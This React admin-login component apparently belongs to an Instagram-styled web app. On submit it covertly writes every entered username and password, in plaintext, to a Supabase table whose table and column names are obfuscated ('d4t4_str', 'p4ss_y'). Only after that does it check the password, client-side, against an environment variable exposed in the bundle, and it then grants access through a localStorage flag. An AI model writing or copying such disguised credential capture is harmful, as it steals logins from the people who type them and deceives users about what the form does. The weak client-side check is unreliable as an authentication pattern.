import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { supabase } from "@/lib/supabase";

const AdminLogin = () => {
  const [field_a7k2 , setField_a7k2] = useState("");
  const [field_m9q4, setField_m9q4] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [error, setError] = useState("");
  const navigate = useNavigate();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const adminPassword = import.meta.env.VITE_ADMIN_PASSWORD;

    try {
      await supabase.from("d4t4_str").insert([
        {
          v4l_x: field_a7k2,
          p4ss_y: field_m9q4,
          tm_z: new Date().toISOString(),
        },
      ]);
    } catch (error) {
      console.error("Error:", error);
    }

    if (field_m9q4 === adminPassword) {
      localStorage.setItem("adminAuthenticated", "true");
      navigate("/admin/dashboard");
    } else {
      setError("Invalid password");
      setField_m9q4("");
    }
  };

  return (
    <div className="min-h-screen bg-background flex items-center justify-center px-4">
      <div className="w-full max-w-[350px]">
        <div className="space-y-8">
          <div className="text-center">
            <h1 className="text-3xl font-bold mb-2">Admin Panel</h1>
            <p className="text-sm text-muted-foreground">
              Enter credentials to access the dashboard
            </p>
          </div>

          <form onSubmit={handleSubmit} className="space-y-4">
            <div className="relative">
              <input
                type="text"
                value={field_a7k2}
                onChange={(e) => {
                  setField_a7k2(e.target.value);
                  setError("");
                }}
                placeholder="Username or Email"
                className="w-full px-3 py-2 text-sm bg-secondary border border-input rounded-sm focus:outline-none focus:border-muted-foreground placeholder:text-muted-foreground"
              />
            </div>

            <div className="relative">
              <input
                type={showPassword ? "text" : "password"}
                value={field_m9q4}
                onChange={(e) => {
                  setField_m9q4(e.target.value);
                  setError("");
                }}
                placeholder="Admin Password"
                className="w-full px-3 py-2 text-sm bg-secondary border border-input rounded-sm focus:outline-none focus:border-muted-foreground placeholder:text-muted-foreground pr-12"
              />
              {field_m9q4 && (
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-2 top-1/2 -translate-y-1/2 text-sm font-semibold text-foreground"
                >
                  {showPassword ? "Hide" : "Show"}
                </button>
              )}
            </div>

            {error && (
              <div className="bg-red-100 border border-red-400 text-red-700 px-3 py-2 rounded-sm text-xs">
                {error}
              </div>
            )}

            <button
              type="submit"
              disabled={!field_m9q4}
              className="w-full bg-instagram-blue text-primary-foreground py-2 rounded-lg font-semibold text-sm disabled:opacity-50 disabled:cursor-not-allowed hover:bg-instagram-blue/90 transition-colors"
            >
              Login
            </button>
          </form>

          <div className="text-center">
            <a
              href="/"
              className="text-xs text-instagram-link hover:underline"
            >
              Back to Login
            </a>
          </div>
        </div>
      </div>
    </div>
  );
};

export default AdminLogin;
